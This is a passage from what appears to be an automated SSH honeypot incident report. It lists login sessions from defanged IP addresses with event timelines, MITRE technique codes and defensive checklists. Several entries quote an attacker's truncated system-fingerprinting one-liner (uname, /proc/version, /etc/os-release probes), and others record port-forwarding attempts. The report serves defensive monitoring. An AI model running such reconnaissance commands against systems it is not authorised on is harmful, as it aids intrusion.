- [ ] Submit `163.7.1[.]218` to AbuseIPDB if not already reported
- [ ] Block `163.7.1[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81de4a706f1f

| Field | Detail |
|---|---|
| **Source IP** | `163.7.1[.]218` |
| **First Seen** | 2026-08-23 19:35 |
| **Last Seen** | 2026-08-23 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:35:42` | `cowrie.session.connect` |
| `2026-08-23 19:35:42` | `cowrie.client.version` |
| `2026-08-23 19:35:42` | `cowrie.client.kex` |
| `2026-08-23 19:35:43` | `cowrie.login.success` |
| `2026-08-23 19:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.1[.]218` to AbuseIPDB if not already reported
- [ ] Block `163.7.1[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0164e21a7318

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:35 |
| **Last Seen** | 2026-08-23 19:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:35:47` | `cowrie.session.connect` |
| `2026-08-23 19:35:47` | `cowrie.client.version` |
| `2026-08-23 19:35:48` | `cowrie.client.kex` |
| `2026-08-23 19:35:49` | `cowrie.login.success` |
| `2026-08-23 19:35:51` | `cowrie.session.params` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.success` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.command.input` |
| `2026-08-23 19:35:51` | `cowrie.log.closed` |
| `2026-08-23 19:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f62fb89e92

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-08-23 19:37 |
| **Last Seen** | 2026-08-23 19:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:37:30` | `cowrie.session.connect` |
| `2026-08-23 19:37:31` | `cowrie.client.version` |
| `2026-08-23 19:37:31` | `cowrie.client.kex` |
| `2026-08-23 19:37:34` | `cowrie.login.success` |
| `2026-08-23 19:37:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99e68603004

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:37 |
| **Last Seen** | 2026-08-23 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:37:31` | `cowrie.session.connect` |
| `2026-08-23 19:37:31` | `cowrie.client.version` |
| `2026-08-23 19:37:32` | `cowrie.client.kex` |
| `2026-08-23 19:37:33` | `cowrie.login.success` |
| `2026-08-23 19:37:34` | `cowrie.session.params` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.success` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.command.input` |
| `2026-08-23 19:37:34` | `cowrie.log.closed` |
| `2026-08-23 19:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8ec6588d48

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:38 |
| **Last Seen** | 2026-08-23 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:38:48` | `cowrie.session.connect` |
| `2026-08-23 19:38:48` | `cowrie.client.version` |
| `2026-08-23 19:38:48` | `cowrie.client.kex` |
| `2026-08-23 19:38:49` | `cowrie.login.success` |
| `2026-08-23 19:38:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:38:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:38:49` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5fe59c4488

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:38 |
| **Last Seen** | 2026-08-23 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:38:52` | `cowrie.session.connect` |
| `2026-08-23 19:38:52` | `cowrie.client.version` |
| `2026-08-23 19:38:52` | `cowrie.client.kex` |
| `2026-08-23 19:38:53` | `cowrie.login.success` |
| `2026-08-23 19:38:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:38:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:38:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7728d67544a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:39 |
| **Last Seen** | 2026-08-23 19:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:39:21` | `cowrie.session.connect` |
| `2026-08-23 19:39:21` | `cowrie.client.version` |
| `2026-08-23 19:39:21` | `cowrie.client.kex` |
| `2026-08-23 19:39:21` | `cowrie.login.success` |
| `2026-08-23 19:39:22` | `cowrie.session.params` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.success` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:22` | `cowrie.command.input` |
| `2026-08-23 19:39:23` | `cowrie.log.closed` |
| `2026-08-23 19:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cba6f94406b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:41 |
| **Last Seen** | 2026-08-23 19:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:41:15` | `cowrie.session.connect` |
| `2026-08-23 19:41:15` | `cowrie.client.version` |
| `2026-08-23 19:41:15` | `cowrie.client.kex` |
| `2026-08-23 19:41:16` | `cowrie.login.success` |
| `2026-08-23 19:41:17` | `cowrie.session.params` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.success` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.command.input` |
| `2026-08-23 19:41:17` | `cowrie.log.closed` |
| `2026-08-23 19:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aac10235a9b

| Field | Detail |
|---|---|
| **Source IP** | `66.175.138[.]122` |
| **First Seen** | 2026-08-23 19:42 |
| **Last Seen** | 2026-08-23 19:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:42:16` | `cowrie.session.connect` |
| `2026-08-23 19:42:17` | `cowrie.client.version` |
| `2026-08-23 19:42:17` | `cowrie.client.kex` |
| `2026-08-23 19:42:19` | `cowrie.login.success` |
| `2026-08-23 19:42:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.175.138[.]122` to AbuseIPDB if not already reported
- [ ] Block `66.175.138[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-013480f883e4

| Field | Detail |
|---|---|
| **Source IP** | `103.111.6[.]121` |
| **First Seen** | 2026-08-23 19:42 |
| **Last Seen** | 2026-08-23 19:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:42:25` | `cowrie.session.connect` |
| `2026-08-23 19:42:25` | `cowrie.client.version` |
| `2026-08-23 19:42:25` | `cowrie.client.kex` |
| `2026-08-23 19:42:27` | `cowrie.login.success` |
| `2026-08-23 19:42:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.111.6[.]121` to AbuseIPDB if not already reported
- [ ] Block `103.111.6[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb9c9e9b94f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:43 |
| **Last Seen** | 2026-08-23 19:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:43:10` | `cowrie.session.connect` |
| `2026-08-23 19:43:10` | `cowrie.client.version` |
| `2026-08-23 19:43:10` | `cowrie.client.kex` |
| `2026-08-23 19:43:11` | `cowrie.login.success` |
| `2026-08-23 19:43:12` | `cowrie.session.params` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.success` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.command.input` |
| `2026-08-23 19:43:12` | `cowrie.log.closed` |
| `2026-08-23 19:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d7d0e964a7a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:45 |
| **Last Seen** | 2026-08-23 19:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:45:06` | `cowrie.session.connect` |
| `2026-08-23 19:45:06` | `cowrie.client.version` |
| `2026-08-23 19:45:06` | `cowrie.client.kex` |
| `2026-08-23 19:45:06` | `cowrie.login.success` |
| `2026-08-23 19:45:08` | `cowrie.session.params` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.success` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.command.input` |
| `2026-08-23 19:45:08` | `cowrie.log.closed` |
| `2026-08-23 19:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bcb2b05362

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:47 |
| **Last Seen** | 2026-08-23 19:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:47:06` | `cowrie.session.connect` |
| `2026-08-23 19:47:06` | `cowrie.client.version` |
| `2026-08-23 19:47:06` | `cowrie.client.kex` |
| `2026-08-23 19:47:07` | `cowrie.login.success` |
| `2026-08-23 19:47:08` | `cowrie.session.params` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.success` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.command.input` |
| `2026-08-23 19:47:08` | `cowrie.log.closed` |
| `2026-08-23 19:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d293b6cacc8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:25` | `cowrie.session.connect` |
| `2026-08-23 19:48:25` | `cowrie.client.version` |
| `2026-08-23 19:48:25` | `cowrie.client.kex` |
| `2026-08-23 19:48:26` | `cowrie.login.success` |
| `2026-08-23 19:48:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:48:26` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337542ddfbd1

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:28` | `cowrie.session.connect` |
| `2026-08-23 19:48:29` | `cowrie.client.version` |
| `2026-08-23 19:48:29` | `cowrie.client.kex` |
| `2026-08-23 19:48:31` | `cowrie.login.success` |
| `2026-08-23 19:48:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff13cbdca16

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:29` | `cowrie.session.connect` |
| `2026-08-23 19:48:29` | `cowrie.client.version` |
| `2026-08-23 19:48:29` | `cowrie.client.kex` |
| `2026-08-23 19:48:30` | `cowrie.login.success` |
| `2026-08-23 19:48:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:48:30` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d858dffe47

| Field | Detail |
|---|---|
| **Source IP** | `36.153.164[.]122` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:41` | `cowrie.session.connect` |
| `2026-08-23 19:48:41` | `cowrie.client.version` |
| `2026-08-23 19:48:41` | `cowrie.client.kex` |
| `2026-08-23 19:48:44` | `cowrie.login.success` |
| `2026-08-23 19:48:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.153.164[.]122` to AbuseIPDB if not already reported
- [ ] Block `36.153.164[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b07556b9a89

| Field | Detail |
|---|---|
| **Source IP** | `112.78.177[.]237` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
